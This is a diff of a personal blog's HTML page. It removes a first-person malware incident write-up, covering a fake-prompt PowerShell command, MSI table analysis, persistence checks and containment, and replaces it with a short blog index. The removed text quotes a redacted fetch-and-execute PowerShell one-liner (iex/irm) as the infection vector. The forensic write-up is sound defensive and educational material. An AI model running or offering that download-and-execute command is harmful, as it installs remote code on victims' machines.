@@ -3,213 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <meta name="description"
-          content="How a suspicious PowerShell command led to two days of digital forensics, MSI analysis and the creation of ReverseTrace.">
-
-    <title>How a Malware Investigation Started ReverseTrace</title>
+    <title>Blog - ReverseTrace</title>
 
     <style>
-        * {
-            box-sizing: border-box;
+        *{
+            box-sizing:border-box;
         }
 
-        body {
-            margin: 0;
-            background: #0d0d0d;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            line-height: 1.8;
+        body{
+            margin:0;
+            background:#0d0d0d;
+            color:white;
+            font-family:Arial,sans-serif;
         }
 
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 24px 8%;
-            border-bottom: 1px solid #252525;
+        header{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:24px 8%;
+            border-bottom:1px solid #252525;
         }
 
-        .brand {
-            font-size: 1.5rem;
-            font-weight: bold;
+        .brand{
+            font-size:1.5rem;
+            font-weight:bold;
         }
 
-        .blue {
-            color: #2ea8ff;
+        .blue{
+            color:#2ea8ff;
         }
 
-        nav a {
-            color: #ffffff;
-            text-decoration: none;
-            margin-left: 24px;
+        nav a{
+            color:white;
+            text-decoration:none;
+            margin-left:24px;
         }
 
-        nav a:hover {
-            color: #2ea8ff;
+        nav a:hover{
+            color:#2ea8ff;
         }
 
-        main {
-            max-width: 900px;
-            margin: auto;
-            padding: 60px 20px;
+        main{
+            max-width:900px;
+            margin:auto;
+            padding:70px 20px;
         }
 
-        .back-link {
-            color: #2ea8ff;
-            text-decoration: none;
+        h1{
+            font-size:3rem;
+            margin-bottom:20px;
         }
 
-        .back-link:hover {
-            text-decoration: underline;
+        p{
+            color:#cccccc;
+            line-height:1.8;
+            font-size:1.1rem;
         }
 
-        h1 {
-            font-size: 3.2rem;
-            line-height: 1.2;
-            margin: 30px 0 14px;
-        }
-
-        h2 {
-            margin-top: 55px;
-            font-size: 2rem;
-        }
-
-        h3 {
-            margin-top: 30px;
-        }
-
-        p,
-        li {
-            color: #cccccc;
-            font-size: 1.08rem;
-        }
-
-        .intro {
-            font-size: 1.25rem;
-            color: #dddddd;
-        }
-
-        .meta {
-            color: #8d8d8d;
-            margin-bottom: 35px;
-        }
-
-        .summary-box,
-        .finding,
-        .warning,
-        .conclusion {
-            background: #151515;
-            border: 1px solid #292929;
-            border-radius: 10px;
-            padding: 24px;
-            margin: 28px 0;
-        }
-
-        .summary-box {
-            border-left: 4px solid #2ea8ff;
-        }
-
-        .warning {
-            border-left: 4px solid #ffb347;
-        }
-
-        .conclusion {
-            border-left: 4px solid #54d17a;
-        }
-
-        .label {
-            display: inline-block;
-            background: #17354a;
-            color: #7fc8ff;
-            padding: 4px 10px;
-            border-radius: 999px;
-            font-size: 0.85rem;
-            margin-right: 8px;
-        }
-
-        code {
-            font-family: Consolas, "Courier New", monospace;
-        }
-
-        pre {
-            overflow-x: auto;
-            background: #050505;
-            color: #7dff9b;
-            border: 1px solid #292929;
-            border-radius: 8px;
-            padding: 20px;
-            line-height: 1.5;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 25px 0;
-        }
-
-        th,
-        td {
-            border: 1px solid #303030;
-            padding: 14px;
-            text-align: left;
-            vertical-align: top;
-        }
-
-        th {
-            background: #171717;
-            color: #ffffff;
-        }
-
-        td {
-            color: #cccccc;
-        }
-
-        .timeline {
-            border-left: 3px solid #2ea8ff;
-            margin: 30px 0;
-            padding-left: 25px;
-        }
-
-        .timeline-item {
-            margin-bottom: 26px;
-        }
-
-        .timeline-time {
-            color: #2ea8ff;
-            font-weight: bold;
-        }
-
-        blockquote {
-            margin: 30px 0;
-            padding: 18px 24px;
-            background: #141414;
-            border-left: 4px solid #2ea8ff;
-            color: #dddddd;
-            font-style: italic;
-        }
-
-        footer {
-            margin-top: 70px;
-            border-top: 1px solid #252525;
-            padding: 25px;
-            color: #777777;
-            text-align: center;
-        }
-
-        @media (max-width: 700px) {
-            header {
-                flex-direction: column;
-                gap: 16px;
-            }
-
-            nav a {
-                margin: 0 8px;
-            }
-
-            h1 {
-                font-size: 2.4rem;
-            }
+        footer{
+            margin-top:60px;
+            border-top:1px solid #252525;
+            padding:25px;
+            text-align:center;
+            color:#777;
         }
     </style>
 </head>
@@ -217,456 +74,46 @@
 <body>
 
 <header>
-    <div class="brand">
-        Reverse<span class="blue">Trace</span>
-    </div>
 
-    <nav>
-        <a href="../index.html">Home</a>
-        <a href="../about.html">About</a>
-        <a href="../blog.html">Blog</a>
-        <a href="../projects.html">Projects</a>
-    </nav>
+<div class="brand">
+Reverse<span class="blue">Trace</span>
+</div>
+
+<nav>
+<a href="index.html">Home</a>
+<a href="about.html">About</a>
+<a href="blog.html">Blog</a>
+<a href="projects.html">Projects</a>
+</nav>
+
 </header>
 
 <main>
 
-<a class="back-link" href="../blog.html">← Back to Blog</a>
-
-<h1>How a Malware Investigation Started ReverseTrace</h1>
-
-<p class="meta">
-    Published July 2026 · Digital Forensics · MSI Analysis · PowerShell
-</p>
-
-<p class="intro">
-    A fake website prompt, one pasted PowerShell command and two days of
-    investigation unexpectedly became the beginning of my journey into
-    digital forensics and reverse engineering.
-</p>
-
-<div class="summary-box">
-    <strong>Investigation summary</strong>
-
-    <p>
-        <span class="label">Duration: 2 days</span>
-        <span class="label">Platform: Windows</span>
-        <span class="label">Method: Static analysis</span>
-    </p>
-
-    <p>
-        The investigation confirmed that remote PowerShell code was executed,
-        an MSI installer was downloaded, and an executable called
-        <code>Too-Electro.exe</code> was installed and launched.
-    </p>
-</div>
-
-<h2>How it started</h2>
+<h1>Blog</h1>
 
 <p>
-The incident began when a website displayed a suspicious prompt telling me to
-open the Windows Run box, paste a command and press Enter. At the time, I did
-not understand what the command would do.
+Welcome to my diary on the digital life. This is where I document what I learn throughout my journey in computer science, computing, cybersecurity, digital forensics and reverse engineering.
+</p>
+
+<hr style="margin:40px 0; border:1px solid #252525;">
+
+<h2>How a Malware Investigation Started ReverseTrace</h2>
+
+<p>
+The story behind how a suspicious MSI file turned into the beginning of cracking down on cybsecurity focus, and the creation of this website.
 </p>
 
 <p>
-The command used PowerShell to retrieve content from a remote server and
-execute it immediately:
+<a href="blog/first-post.html" style="color:#2ea8ff; text-decoration:none;">
+Read article →
+</a>
 </p>
-
-<pre><code>powershell -c "iex(irm 'http://[redacted]/[redacted]' -UseBasicParsing)"</code></pre>
-
-<p>
-I have deliberately redacted the live address. The important parts were
-<code>irm</code>, which retrieved remote content, and <code>iex</code>, which
-executed that content directly.
-</p>
-
-<div class="warning">
-    <strong>Important:</strong>
-    This command should not be copied or tested. It is included only as a
-    sanitised example of the technique used.
-</div>
-
-<h2>Moving from panic to evidence</h2>
-
-<p>
-My first reaction was fear. I worried that somebody might still be controlling
-the laptop or that personal files, browser data and university work had been
-stolen.
-</p>
-
-<p>
-Instead of immediately wiping Windows, I began checking what had actually
-happened. The main lesson was that digital forensics depends on evidence, not
-assumptions.
-</p>
-
-<blockquote>
-    I stopped asking only, "Have I been hacked?" and started asking,
-    "What evidence does the computer contain?"
-</blockquote>
-
-<h2>Reconstructing the chain</h2>
-
-<div class="timeline">
-
-    <div class="timeline-item">
-        <div class="timeline-time">Stage 1 - PowerShell execution</div>
-        <p>
-            The pasted command downloaded and executed remote PowerShell code.
-        </p>
-    </div>
-
-    <div class="timeline-item">
-        <div class="timeline-time">Stage 2 - Installer downloaded</div>
-        <p>
-            A folder named <code>C:\ProgramData\DeviceSync</code> appeared,
-            containing an MSI file named <code>DETVGREL-F1.msi</code>.
-        </p>
-    </div>
-
-    <div class="timeline-item">
-        <div class="timeline-time">Stage 3 - MSI executed</div>
-        <p>
-            Evidence indicated that the installer ran silently through
-            Windows Installer.
-        </p>
-    </div>
-
-    <div class="timeline-item">
-        <div class="timeline-time">Stage 4 - Payload installed</div>
-        <p>
-            The MSI installed files into
-            <code>%LOCALAPPDATA%\Township</code>.
-        </p>
-    </div>
-
-    <div class="timeline-item">
-        <div class="timeline-time">Stage 5 - Executable launched</div>
-        <p>
-            The installer automatically launched
-            <code>Too-Electro.exe</code>.
-        </p>
-    </div>
-
-</div>
-
-<h2>Inspecting the MSI</h2>
-
-<p>
-An MSI file is not simply one executable. It is a structured Windows Installer
-database containing tables that describe files, components, directories,
-installation sequences and custom actions.
-</p>
-
-<p>
-I used PowerShell and the Windows Installer COM interface to open the MSI
-database in read-only mode.
-</p>
-
-<pre><code>$wi = New-Object -ComObject WindowsInstaller.Installer
-
-$db = $wi.GetType().InvokeMember(
-    "OpenDatabase",
-    "InvokeMethod",
-    $null,
-    $wi,
-    @("C:\ProgramData\DeviceSync.QUARANTINED\DETVGREL-F1.msi", 0)
-)</code></pre>
-
-<p>
-The value <code>0</code> opened the MSI database read-only. This allowed me to
-inspect its internal tables without installing it again.
-</p>
-
-<h3>The Property table</h3>
-
-<p>
-The Property table revealed what the installer claimed to be:
-</p>
-
-<table>
-    <tr>
-        <th>Property</th>
-        <th>Value found</th>
-    </tr>
-    <tr>
-        <td>Product name</td>
-        <td>Pulsojet</td>
-    </tr>
-    <tr>
-        <td>Product version</td>
-        <td>7.6.8.0</td>
-    </tr>
-    <tr>
-        <td>Language</td>
-        <td>1033 - English (United States)</td>
-    </tr>
-</table>
-
-<h3>The CustomAction table</h3>
-
-<p>
-The most important discovery came from the MSI's
-<code>CustomAction</code> table:
-</p>
-
-<pre><code>Action: LaunchFile
-Type: 210
-Source: JziBx1g7YA
-Target:</code></pre>
-
-<p>
-This showed that the installer contained a custom action called
-<code>LaunchFile</code>.
-</p>
-
-<h3>The InstallExecuteSequence table</h3>
-
-<p>
-The corresponding sequence entry showed:
-</p>
-
-<pre><code>Action: LaunchFile
-Condition:
-Sequence: 6601</code></pre>
-
-<p>
-The blank condition meant that the action was not restricted by a special
-condition. It was scheduled to run after the installation sequence completed.
-</p>
-
-<h3>Tracing the internal file identifier</h3>
-
-<p>
-The internal source identifier <code>JziBx1g7YA</code> was then traced through
-the MSI's File table:
-</p>
-
-<pre><code>File ID: JziBx1g7YA
-Component: JziBx1g7YA
-Filename: bguiueva.exe|Too-Electro.exe
-Size: 465264</code></pre>
-
-<p>
-Windows Installer stores some filenames in a
-<code>short-name|long-name</code> format. The normal installed filename was
-therefore <code>Too-Electro.exe</code>.
-</p>
-
-<h3>Finding the installation location</h3>
-
-<p>
-The component was connected to an MSI directory called
-<code>INSTALLFOLDER</code>. The Directory table revealed:
-</p>
-
-<pre><code>Directory: INSTALLFOLDER
-Parent: LocalAppDataFolder
-DefaultDir: Township</code></pre>
-
-<p>
-That translated to the following installation path:
-</p>
-
-<pre><code>C:\Users\&lt;username&gt;\AppData\Local\Township\Too-Electro.exe</code></pre>
-
-<h2>What the MSI installed</h2>
-
-<p>
-The MSI contained more than one executable. It included supporting Autodesk
-licensing-style components, Qt libraries and Microsoft runtime files.
-</p>
-
-<table>
-    <tr>
-        <th>Example file</th>
-        <th>Purpose or observation</th>
-    </tr>
-    <tr>
-        <td>Too-Electro.exe</td>
-        <td>The executable installed and launched by the MSI.</td>
-    </tr>
-    <tr>
-        <td>adlmutil.dll</td>
-        <td>Autodesk licensing-related support library.</td>
-    </tr>
-    <tr>
-        <td>lmgrd.dll</td>
-        <td>Licensing-related component.</td>
-    </tr>
-    <tr>
-        <td>msvcp140.dll</td>
-        <td>Microsoft Visual C++ runtime library.</td>
-    </tr>
-    <tr>
-        <td>vcruntime140.dll</td>
-        <td>Microsoft Visual C++ runtime library.</td>
-    </tr>
-</table>
-
-<h2>Checking whether it remained active</h2>
-
-<p>
-After identifying the installed file and its location, I checked common
-persistence mechanisms. These are methods software can use to restart
-automatically after a reboot.
-</p>
-
-<p>The checks included:</p>
-
-<ul>
-    <li>Running processes</li>
-    <li>Scheduled tasks</li>
-    <li>Windows services</li>
-    <li>Registry Run keys</li>
-    <li>Windows Startup folders</li>
-    <li>WMI event consumers and bindings</li>
-    <li>Installed-program entries</li>
-</ul>
-
-<p>
-A suspicious scheduled task named <code>Storeauth_amd64</code> had previously
-been identified and removed. Later checks did not find any surviving matching
-task, service, Run-key entry, Startup item or WMI consumer.
-</p>
-
-<h2>Hashes and signatures</h2>
-
-<p>
-I also calculated SHA-256 hashes. A hash acts like a file fingerprint and can
-be used to identify an exact file without executing it.
-</p>
-
-<pre><code>Get-FileHash "path\to\file" -Algorithm SHA256</code></pre>
-
-<p>
-The executable reported Autodesk ADLM version information and had a valid
-Autodesk digital signature. However, that did not automatically make the
-overall installation trustworthy. A legitimate signed file can still be
-renamed, repackaged or used in a suspicious context.
-</p>
-
-<h2>Containment and scanning</h2>
-
-<p>
-The two known incident folders were renamed to prevent their original paths
-from working while preserving the evidence:
-</p>
-
-<pre><code>Township
-→ Township.QUARANTINED
-
-DeviceSync
-→ DeviceSync.QUARANTINED</code></pre>
-
-<p>
-I then completed security scans using:
-</p>
-
-<ul>
-    <li>Microsoft Defender</li>
-    <li>Microsoft Defender Offline Scan</li>
-    <li>Malwarebytes</li>
-</ul>
-
-<p>
-Malwarebytes reported zero threats, and no active Defender threat connected to
-this incident was found.
-</p>
-
-<h2>What I confirmed</h2>
-
-<div class="finding">
-    <ul>
-        <li>Remote PowerShell code executed.</li>
-        <li>An MSI installer was downloaded.</li>
-        <li>The MSI installed files into Local AppData.</li>
-        <li>The MSI installed and launched <code>Too-Electro.exe</code>.</li>
-        <li>Execution evidence existed for that filename.</li>
-        <li>No surviving obvious persistence was found afterwards.</li>
-        <li>Later antivirus scans did not find an active infection.</li>
-    </ul>
-</div>
-
-<h2>What I could not confirm</h2>
-
-<div class="warning">
-    <ul>
-        <li>Whether browser cookies or saved passwords were accessed.</li>
-        <li>Whether personal documents or photos were copied.</li>
-        <li>Whether data was uploaded to a remote server.</li>
-        <li>The complete behaviour of <code>Too-Electro.exe</code> while it ran.</li>
-    </ul>
-</div>
-
-<p>
-No evidence of data theft was found, but the absence of historical packet
-captures or complete forensic logging meant that data theft could not be ruled
-out with absolute certainty.
-</p>
-
-<h2>What I learned</h2>
-
-<p>
-Before this incident, I did not know what Local AppData was, how an MSI database
-was structured, or how PowerShell could be used for forensic investigation.
-</p>
-
-<p>
-Over two days, I learned how to:
-</p>
-
-<ul>
-    <li>Follow a chain of execution from PowerShell to an MSI installer.</li>
-    <li>Read Windows Installer database tables.</li>
-    <li>Trace internal component and file identifiers.</li>
-    <li>Check common Windows persistence mechanisms.</li>
-    <li>Use hashes and digital signatures as evidence.</li>
-    <li>Distinguish between confirmed facts and unanswered questions.</li>
-</ul>
-
-<blockquote>
-    The most important lesson was that cybersecurity is not about making the
-    most frightening assumption. It is about collecting evidence, testing each
-    possibility and being honest about what remains unknown.
-</blockquote>
-
-<h2>Why I created ReverseTrace</h2>
-
-<p>
-This investigation transformed fear into curiosity. I began by trying to find
-out whether my laptop was safe. I ended up learning that I enjoyed following
-digital evidence, understanding software structure and working backwards from
-an incident to reconstruct what happened.
-</p>
-
-<p>
-That is why I created ReverseTrace.
-</p>
-
-<p>
-It is my notebook, my journal and my journey through computer science,
-computing and cybersecurity.
-</p>
-
-<div class="conclusion">
-    <strong>Final conclusion</strong>
-
-    <p>
-        The investigation confirmed remote code execution and identified what
-        the downloaded MSI installed and launched. No evidence was found that
-        the malware remained active or persistent after containment and
-        scanning. However, the exact actions performed by the launched
-        executable during its execution window could not be fully reconstructed.
-    </p>
-</div>
 
 </main>
 
 <footer>
-    © 2026 ReverseTrace
+© 2026 ReverseTrace
 </footer>
 
 </body>
